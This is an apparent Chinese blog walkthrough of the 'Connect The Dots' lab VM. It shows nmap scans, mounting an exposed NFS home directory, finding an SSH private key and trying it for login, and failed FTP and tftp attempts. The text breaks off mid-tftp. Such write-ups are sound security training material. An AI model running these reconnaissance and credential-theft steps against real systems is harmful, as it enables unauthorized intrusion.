@@ -1,0 +1,785 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Connect The Dots信息收集123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475┌──(kali㉿kali)-[~]└─$ sudo nmap --min-r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Connect The Dots">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/06/4719fa4167fd.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Connect The Dots信息收集123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475┌──(kali㉿kali)-[~]└─$ sudo nmap --min-r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/0227b8e4e8ef8e98b73888276757ac08_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b545a1a530fe57030b285dad593ece46_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/c92d9bb6f08fba9bc68bd64f38419131_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/d63de15867a560e1991a0c41f8ff628a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/5d2db95f8a3cd0eeb26deab9728de09f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/aa431a16060a553fe9e0b79712c42fdb_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/5d23246930d2729618b15fc7772a0df0_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/2318451b3ceba9077ac3987e32ddd86a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/fa9653bfc2a374c36947a5d7e5aacc33_MD5.png">
+<meta property="article:published_time" content="2023-06-12T14:23:15.000Z">
+<meta property="article:modified_time" content="2023-06-13T09:47:24.532Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/0227b8e4e8ef8e98b73888276757ac08_MD5.png">
+  
+  
+  
+  <title>Connect The Dots - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Connect The Dots"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-12 22:23" pubdate>
+          2023年6月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          28k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          236 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Connect The Dots</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Connect-The-Dots"><a href="#Connect-The-Dots" class="headerlink" title="Connect The Dots"></a>Connect The Dots</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.112            <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 09:34 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.000085s latency).<br>Not shown: 65526 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>2049/tcp  open  nfs<br>7822/tcp  open  unknown<br>33547/tcp open  unknown<br>34175/tcp open  unknown<br>40731/tcp open  unknown<br>44757/tcp open  unknown<br>MAC Address: 08:00:27:33:4B:05 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.44 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -p21,80,111,2049,7822 192.168.56.112<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 09:36 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.00047s latency).<br><br>PORT     STATE SERVICE VERSION<br>21/tcp   open  ftp     vsftpd 2.0.8 or later<br>80/tcp   open  http    Apache httpd 2.4.38 ((Debian))<br>111/tcp  open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span><br>2049/tcp open  nfs_acl 3 (RPC <span class="hljs-comment">#100227)</span><br>7822/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<br>MAC Address: 08:00:27:33:4B:05 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.93 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.112              <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 09:37 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.00030s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   open|filtered snmp<br>162/udp   closed        snmptrap<br>445/udp   open|filtered microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   open|filtered syslog<br>520/udp   closed        route<br>631/udp   open|filtered ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:33:4B:05 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.62 seconds<br></code></pre></td></tr></table></figure>
+
+<p>nmap自带脚本的漏洞扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p21,80,111,2049,7822 192.168.56.112<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-12 09:40 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.112<br>Host is up (0.00020s latency).<br><br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>80/tcp   open  http<br>| http-fileupload-exploiter: <br>|   <br>|     Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|     Couldn\&#x27;</span>t find a file-type field.<br>|   <br>|_    Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-internal-ip-disclosure: </span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>| http-sql-injection: <br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.56.112:80/mysite/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|_    http://192.168.56.112:80/mysite/?C=D%3BO%3DA%27%20OR%20sqlspider<br>| http-enum: <br>|   /images/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.38 (debian)&#x27;</span><br>|_  /manual/: Potentially interesting folder<br>111/tcp  open  rpcbind<br>2049/tcp open  nfs<br>7822/tcp open  unknown<br>MAC Address: 08:00:27:33:4B:05 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 31.11 seconds<br></code></pre></td></tr></table></figure>
+
+<p>信息比较杂乱，这里汇总一下,开放的端口有：21 ftp、80 http、111 rpcbind、2049 nfs、7822 ssh，一些临时动态端口（五位数的），可能开放的有价值的端口有：69 tftp、445 smb。顺便试错，看看 tftp 到底开放了没有，直接去连接</p>
+<h2 id="nfs-渗透"><a href="#nfs-渗透" class="headerlink" title="nfs 渗透"></a>nfs 渗透</h2><p>首先 <code>showmount</code> 看看有哪些挂载点，然后在 tmp 文件夹中创建新文件夹，挂载到本机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ showmount -e 192.168.56.112  <br>Export list <span class="hljs-keyword">for</span> 192.168.56.112:<br>/home/morris *<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">mkdir</span> /tmp/infosec                                         <br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo mount -t nfs 192.168.56.112:/home/morris /tmp/infosec      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cd</span> /tmp/infosec<br></code></pre></td></tr></table></figure>
+
+<p>查看挂载点中有哪些文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 56K<br> 131648 drwxr-xr-x  8 kali kali 4.0K Oct 11  2019 .<br>4194305 drwxrwxrwt 16 root root 4.0K Jun 12 08:59 ..<br> 179003 -rw-------  1 kali kali    1 Oct 11  2019 .bash_history<br> 134179 -rw-r--r--  1 kali kali  220 Oct 10  2019 .bash_logout<br> 134178 -rw-r--r--  1 kali kali 3.5K Oct 10  2019 .bashrc<br> 179000 drwx------  9 kali kali 4.0K Oct 10  2019 .cache<br> 179011 drwx------ 10 kali kali 4.0K Oct 11  2019 .config<br> 178998 drwx------  3 kali kali 4.0K Oct 10  2019 .gnupg<br> 179012 -rw-------  1 kali kali 1.9K Oct 11  2019 .ICEauthority<br> 179032 drwx------  3 kali kali 4.0K Oct 10  2019 .<span class="hljs-built_in">local</span><br> 134182 -rw-r--r--  1 kali kali  807 Oct 10  2019 .profile<br> 179139 drwx------  2 kali kali 4.0K Oct 10  2019 .ssh<br> 179081 drwxr-xr-x  2 kali kali 4.0K Oct 10  2019 Templates<br></code></pre></td></tr></table></figure>
+
+<p>bash_history 虽然重要，但是这里文件大小显示出其并没有那么大的价值，首先看看.ssh 目录下有哪些东西</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cd</span> .ssh <br><br>┌──(kali㉿kali)-[/tmp/infosec/.ssh]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 16K<br>179139 drwx------ 2 kali kali 4.0K Oct 10  2019 .<br>131648 drwxr-xr-x 8 kali kali 4.0K Oct 11  2019 ..<br>178994 -rw------- 1 kali kali 1.8K Oct 11  2019 id_rsa<br>179004 -rw-r--r-- 1 kali kali  395 Oct 11  2019 id_rsa.pub<br></code></pre></td></tr></table></figure>
+
+<p>查看公钥内容，得到了用户名和主机名，接下来尝试把私钥拷贝到本机，尝试用私钥看看能不能直接登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec/.ssh]<br>└─$ <span class="hljs-built_in">cat</span> id_rsa.pub<br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuTwJDj/B/FtGRkTEiwpoq52/jXtaeB2/R4+hyvAo6FuWeGvl+dvkgBkA5dL647UJXx6DUTh+xkZSav9BKOeSpZ2qcUP8lMf+H9j5LChu/E5B7dZEUDJAm8QzwJJIIDGhVoqdyVVL4kU8vOzdgLHjxj9VRsoHICuum6/SHDdTGUcQV1fFgYlZrrNcVeWZtEudN6PXF8JrjmGcLliVKRrntucCe/quT7HMHOcsnZDayumfKK/P/p825ZvnHtHPazgh41SmLbgltOz+V1NBYrGNPwrrZgZw2lKuDVExW+tRy5Qr9t92KS7JEE2626vNcG9DRpNDt9iRMWAfoGfloJ9Nf morris@sirrom<br> <br></code></pre></td></tr></table></figure>
+
+<p>尝试用私钥登录，另外信息搜集的结果中 22 端口并没有开放，7822 端口对应 ssh 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ssh -i id_rsa morris@192.168.56.112 -p 7822<br>morris@192.168.56.112<span class="hljs-string">&#x27;s password:</span><br></code></pre></td></tr></table></figure>
+
+<p>显示需要密码，那就只能暂时搁置，接着考虑如何获取到密码</p>
+<h2 id="ftp-渗透"><a href="#ftp-渗透" class="headerlink" title="ftp 渗透"></a>ftp 渗透</h2><p>尝试 ftp 匿名登录，另外刚才查看公钥得到了一个新的用户名，都可以试一试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ftp 192.168.56.112<br>Connected to 192.168.56.112.<br>220 Welcome to Heaven!<br>Name (192.168.56.112:kali): anonymous<br>530 Permission denied.<br>ftp: Login failed<br>ftp&gt; <span class="hljs-built_in">exit</span><br>221 Goodbye.<br><br>┌──(kali㉿kali)-[~/Downloads/connectthedots]<br>└─$ ftp 192.168.56.112<br>Connected to 192.168.56.112.<br>220 Welcome to Heaven!<br>Name (192.168.56.112:kali): morris<br>530 Permission denied.<br>ftp: Login failed<br>ftp&gt; <span class="hljs-built_in">exit</span><br>221 Goodbye.<br></code></pre></td></tr></table></figure>
+
+<p>都失败了，有点郁闷，还有个 tftp 尝试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ tftp 192.168.56.112<br>tftp&gt; <span class="hljs-built_in">ls</span><br>?Invalid <span class="hljs-built_in">command</span><br>tftp&gt; <br>tftp&gt; ?<br>Commands may be abbreviated.  Commands are:<br><br>connect         connect to remote tftp<br>mode            <span class="hljs-built_in">set</span> file transfer mode<br>put             send file<br>get             receive file<br>quit            <span class="hljs-built_in">exit</span> tftp<br>verbose         toggle verbose mode<br>trace           toggle packet tracing<br>status          show current status<br>binary          <span class="hljs-built_in">set</span> mode to octet<br>ascii           <span class="hljs-built_in">set</span> mode to netascii<br>rexmt           <span class="hljs-built_in">set</span> per-packet retransmission <span class="hljs-built_in">timeout</span><br><span class="hljs-built_in">timeout</span>         <span class="hljs-built_in">set</span> total retransmission <span 